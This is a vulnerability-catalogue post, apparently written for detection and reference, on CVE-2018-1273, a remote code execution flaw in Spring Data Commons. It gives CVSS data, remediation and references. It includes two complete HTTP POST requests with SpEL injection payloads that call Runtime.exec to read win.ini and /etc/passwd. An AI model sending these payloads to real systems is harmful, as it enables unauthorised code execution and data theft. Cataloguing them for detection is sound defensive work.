---
layout: "post"
cve_id: "CVE-2018-1273"
title: "Spring Data Commons - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2018/CVE-2018-1273.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-1273.yaml"
author: "dwisiswant0"
severity: "critical"
impact: "Successful exploitation of this vulnerability could lead to remote code execution, allowing an attacker to execute arbitrary code on the affected system.
"
remediation: "Apply the latest security patches provided by the vendor to fix the deserialization vulnerability.
"
reference:
  - "https://nvd.nist.gov/vuln/detail/CVE-2018-1273"
  - "https://pivotal.io/security/cve-2018-1273"
  - "http://mail-archives.apache.org/mod_mbox/ignite-dev/201807.mbox/%3CCAK0qHnqzfzmCDFFi6c5Jok19zNkVCz5Xb4sU%3D0f2J_1i4p46zQ%40mail.gmail.com%3E"
  - "https://www.oracle.com/security-alerts/cpujul2022.html"
  - "https://github.com/2lambda123/SBSCAN"
classification: "{'cvss-metrics': 'CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2018-1273', 'cwe-id': 'CWE-20,CWE-94', 'epss-score': 0.94288, 'epss-percentile': 0.99935, 'cpe': 'cpe:2.3:a:pivotal_software:spring_data_commons:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 2, 'vendor': 'pivotal_software', 'product': 'spring_data_commons'}"
tags:
  - "cve"
  - "cve2018"
  - "vmware"
  - "rce"
  - "spring"
  - "kev"
  - "pivotal_software"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Spring Data Commons, versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5,
and older unsupported versions, contain a property binder vulnerability
caused by improper neutralization of special elements.
An unauthenticated remote malicious user (or attacker) can supply
specially crafted request parameters against Spring Data REST backed HTTP resources
or using Spring Data's projection-based request payload binding hat can lead to a remote code execution attack.


## üåê HTTP Request
```nohighlight
POST /account HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; hu-HU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
Content-Length: 116
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('type%20C%3A%5C%2FWindows%5C%2Fwin.ini')]=wxmwj
```

```nohighlight
POST /account HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15
Content-Length: 100
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('cat%20%2Fetc%2Fpasswd')]=raxyq
```

